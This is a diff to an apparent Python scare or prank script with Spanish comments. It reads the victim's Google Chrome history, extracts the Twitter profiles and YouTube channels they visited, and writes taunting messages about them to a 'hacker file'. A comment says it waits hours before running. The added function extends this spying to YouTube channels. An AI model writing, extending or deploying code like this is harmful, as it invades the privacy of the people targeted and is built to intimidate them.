@@ -47,7 +47,18 @@ def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
         results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
         if results and results[0] not in ["notifications", "home"]:
             profiles_visited.append(results[0])
-    hacker_file.write(f"He visto que has visitado los perfiles de {', '.join(profiles_visited)}, interesante.....")
+    hacker_file.write(f"He visto que has visitado los perfiles de Twitter(X) {', '.join(profiles_visited)}, "
+                      f"interesante.....")
+
+def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
+    profiles_visited = []
+    for item in chrome_history:
+        results = re.findall(r"\(\d+\)\s([^-\n]+)", item[0])
+        if results:
+            profiles_visited.append(results[0])
+            profiles_visited = list(set(profiles_visited))
+    hacker_file.write(f"\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
+                      f"ajaaaa.....")
 
 def main():
     #Esperamos algunas horas para que se ejecute el script
@@ -62,6 +73,7 @@ def main():
     #Obtenemos su historial de Google Chrome cuando sea posible
     chrome_history = get_chrome_history()
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
+    check_youtube_profiles_and_scare_user(hacker_file,chrome_history)
 
 if __name__ == "__main__":
     main()
